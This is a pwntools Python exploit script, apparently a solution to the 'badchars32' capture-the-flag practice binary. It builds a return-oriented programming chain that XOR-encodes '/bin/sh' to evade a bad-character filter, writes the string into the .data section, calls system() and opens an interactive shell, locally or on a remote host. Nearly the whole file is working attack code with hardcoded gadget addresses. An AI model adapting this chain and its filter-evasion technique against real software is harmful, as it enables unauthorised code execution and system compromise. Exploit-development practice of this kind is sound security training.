#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./badchars32')
# context.terminal = ['tmux', 'splitw', '-h']
context.terminal = ['tmux', 'new-window']

host = args.HOST or ''
port = int(args.PORT or 8080)

def local(argv=[], *a, **kw):
    return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote(argv, *a, **kw)
    else:
        return local(argv, *a, **kw)

def write(write_addr, string, badchars):
    MOV_EDI_ESI = 0x08048893
    POP_ESI_EDI = 0x08048899
    XOR_EBX_CL = 0x08048890
    rop = ROP(exe)
    POP_EBX_ECX = rop.find_gadget(["pop ebx", "pop ecx", "ret"]).address
    string = string + "\x00"
    chain = ""
    # Pad string to make it a multiple of 4
    if len(string) % 4 != 0:
        string = string + "\x00"*(4 - len(string) % 4)
    # Check the characters we want to write. If the string contains a character in badchars, find an allowed character and xor them
    # Store both characters. We will write the first, then xor it with the second so we get back the desired char
    # If the initial character is allowed, write it as is and xor it with 0
    # There was probably a simpler way to do this
    for i in range(0, len(string), 4):
        target_str = string[i:i+4]
        input_str = ""
        xor_str = ""
        for j in range(4):
            if target_str[j] in badchars:
                char_ok = badchars[0] 
                char_xor = ord(char_ok) ^ ord(target_str[j])
                while char_ok in badchars or char_xor in badchars:
                    char_ok = chr(ord(char_ok) + 1)
                    char_xor = chr(ord(char_ok) ^ ord(target_str[j]))
                input_str += char_ok   
                xor_str += char_xor
            else:
                input_str += target_str[j] 
                xor_str += '\x00'

        # Write the string with the allowed characters
        chain += p32(POP_ESI_EDI)
        chain += input_str
        chain += p32(WRITE_ADDR+i)
        chain += p32(MOV_EDI_ESI)

        # Xor each char to get the desired char
        # Pop ecx to change cl
        for j in range(4):
            chain += p32(POP_EBX_ECX)
            chain += p32(WRITE_ADDR+i+j)
            chain += xor_str[j] * 4
            chain += p32(XOR_EBX_CL)

    return chain

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

if args.GEF:
    gdb.attach(io, gdb_args=['-q', '-ex', 'init-gef'], gdbscript='''
    ''')
    # pie breakpoint function+118

if args.PWNDBG:
    gdb.attach(io, gdb_args=['-q', '-ex', 'init-pwndbg'], gdbscript='''
    ''')
    # piebase 0x7f0

WRITE_ADDR = 0x0804a038 # .data
POP_EBX_ECX = 0x08048896
SYSTEM_ADDR = exe.sym.system
badchars = [ 'b', 'i', 'c', '/', '\x20', 'f', 'n', 's', '\x0a' ]
string = "/bin/sh"

# io.sendline(cyclic(1024))
OFFSET = cyclic_find(0x6161616c)
payload = "A" * OFFSET
payload += write(WRITE_ADDR, string, badchars)

payload += p32(SYSTEM_ADDR)
payload += "BBBB"
payload += p32(WRITE_ADDR)

io.sendline(payload)

io.interactive()

